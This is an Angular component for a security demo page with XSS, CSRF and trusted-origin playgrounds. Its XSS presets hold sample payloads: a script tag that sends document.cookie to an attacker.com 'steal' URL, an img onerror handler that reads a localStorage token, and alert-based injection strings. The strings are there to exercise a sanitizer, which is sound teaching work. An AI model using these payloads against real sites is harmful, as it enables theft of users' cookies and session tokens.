import { ChangeDetectionStrategy, Component, inject, signal } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { SecurityService, XssScanResult } from '../../core/services/security.service';
import { AuthService } from '../../core/services/auth.service';
import { APP_CONFIG, defaultAppConfig } from '../../core/config/app-config';
import { SafeHtmlPipe } from '../../core/pipes/safe-html.pipe';
import { NotificationService } from '../../core/services/notification.service';

@Component({
  selector: 'app-security-demo',
  standalone: true,
  imports: [CommonModule, FormsModule, SafeHtmlPipe],
  changeDetection: ChangeDetectionStrategy.OnPush,
  templateUrl: './security-demo.component.html',
  styleUrls: ['./security-demo.component.scss']
})
export class SecurityDemoComponent {
  private readonly security = inject(SecurityService);
  readonly auth = inject(AuthService);
  readonly config = inject(APP_CONFIG, { optional: true }) || defaultAppConfig;
  private readonly notification = inject(NotificationService);

  // XSS Playground State
  readonly rawInput = signal<string>('<script>alert("Malicious XSS Script Injected!")</script><b style="color:red" onmouseover="alert(\'Inline Exploit\')">Hover for exploit!</b> <p>Normal text with safe tags.</p>');
  readonly xssAnalysis = signal<XssScanResult>(this.security.analyzeUntrustedInput(this.rawInput()));

  // CSRF Playground State
  readonly csrfSimResult = signal<{ success: boolean; message: string } | null>(null);

  // Trusted Origins State
  readonly testUrl = signal<string>('https://api.enterprise-portal.internal/v1/workforce');
  readonly isUrlTrusted = signal<boolean>(true);

  onInputChange(val: string): void {
    this.rawInput.set(val);
    this.xssAnalysis.set(this.security.analyzeUntrustedInput(val));
  }

  loadPreset(type: 'script' | 'event' | 'safe'): void {
    let snippet = '';
    if (type === 'script') {
      snippet = '<script>fetch("https://attacker.com/steal?cookie=" + document.cookie)</script><strong>Legitimate heading</strong>';
    } else if (type === 'event') {
      snippet = '<img src="missing.png" onerror="alert(\'Stealing token: \' + window.localStorage.getItem(\'token\'))" alt="Injected Avatar">';
    } else {
      snippet = '<p>Welcome to <strong>Enterprise Pulse</strong>! Please verify your <em>credentials</em>.</p>';
    }

    this.onInputChange(snippet);
  }

  simulateCsrfRequest(isValidToken: boolean): void {
    const expectedToken = this.auth.csrfToken();
    const submittedToken = isValidToken ? expectedToken : 'INVALID_OR_TAMPERED_TOKEN';

    const isValid = this.security.verifyCsrfToken(submittedToken, expectedToken);

    if (isValid) {
      this.csrfSimResult.set({
        success: true,
        message: `HTTP 200 OK: Anti-CSRF token '${submittedToken}' validated against session. State-changing POST mutation authorized.`
      });
      this.notification.show({
        type: 'success',
        title: 'CSRF Validation Passed',
        message: 'Valid X-XSRF-TOKEN verified by backend security interceptor.'
      });
    } else {
      this.csrfSimResult.set({
        success: false,
        message: `HTTP 403 Forbidden: Anti-CSRF token '${submittedToken}' mismatched or missing. Request blocked to prevent Cross-Site Request Forgery!`
      });
      this.notification.show({
        type: 'error',
        title: '403 CSRF Attack Blocked',
        message: 'Forged mutation request intercepted and rejected.'
      });
    }
  }

  testOriginCheck(url: string): void {
    this.testUrl.set(url);
    this.isUrlTrusted.set(this.security.isOriginTrusted(url));
  }
}
